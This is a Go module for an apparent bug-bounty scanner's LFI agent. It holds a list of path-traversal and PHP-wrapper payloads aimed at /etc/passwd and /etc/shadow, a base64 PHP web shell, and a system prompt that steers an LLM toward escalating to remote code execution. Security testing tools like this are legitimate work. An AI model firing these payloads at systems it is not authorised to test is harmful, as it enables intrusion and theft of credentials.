// Package lfi implements the Local File Inclusion / Path Traversal specialist agent.
package lfi

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "LFI Agent" }
func (a *Agent) ID() string           { return "lfi" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	var findings []*base.Finding
	for _, p := range payloads {
		findings = append(findings, &base.Finding{
			Type:       "LFI",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   mapSeverity(priority),
			Confidence: 0.0,
			Evidence:   map[string]interface{}{"technique": p.technique, "target_file": p.targetFile},
			Method:     "GET",
		})
	}
	return findings, nil
}

type lfiPayload struct {
	payload    string
	technique  string
	targetFile string
}

var payloads = []lfiPayload{
	// Basic path traversal
	{"../../../etc/passwd", "basic_traversal", "/etc/passwd"},
	{"..\\..\\..\\windows\\win.ini", "windows_traversal", "win.ini"},
	{"....//....//....//etc/passwd", "double_dot_bypass", "/etc/passwd"},
	{"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded", "/etc/passwd"},
	{"..%252f..%252f..%252fetc%252fpasswd", "double_url_encoded", "/etc/passwd"},
	{"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "utf8_overlong", "/etc/passwd"},
	{"....//....//....//etc/shadow", "shadow_read", "/etc/shadow"},
	// Null byte injection (legacy PHP)
	{"../../../etc/passwd%00.jpg", "null_byte", "/etc/passwd"},
	// Wrapper-based (PHP)
	{"php://filter/convert.base64-encode/resource=index.php", "php_wrapper", "index.php"},
	{"php://input", "php_input", "stdin"},
	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "data_wrapper", "rce_via_data"},
	// Application-specific
	{"/proc/self/environ", "proc_environ", "env_vars"},
	{"/proc/self/cmdline", "proc_cmdline", "process_info"},
	{"/var/log/apache2/access.log", "log_poisoning", "apache_log"},
}

func mapSeverity(p string) string {
	switch strings.ToLower(p) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	default:
		return "high"
	}
}

const defaultSystemPrompt = `You are an elite LFI/Path Traversal specialist with deep expertise in:
- Directory traversal (../ sequences with encoding variations)
- PHP wrapper exploitation (php://filter, php://input, data://)
- Null byte injection for extension bypass
- Log poisoning for RCE escalation
- /proc filesystem information disclosure

RULES:
1. Start with basic traversal, escalate to encoded variants
2. Test for both Linux (/etc/passwd) and Windows (win.ini) targets
3. If PHP detected, prioritize wrapper-based attacks
4. LFI to sensitive file read is HIGH severity
5. LFI to RCE (via log poisoning or wrappers) is CRITICAL severity`
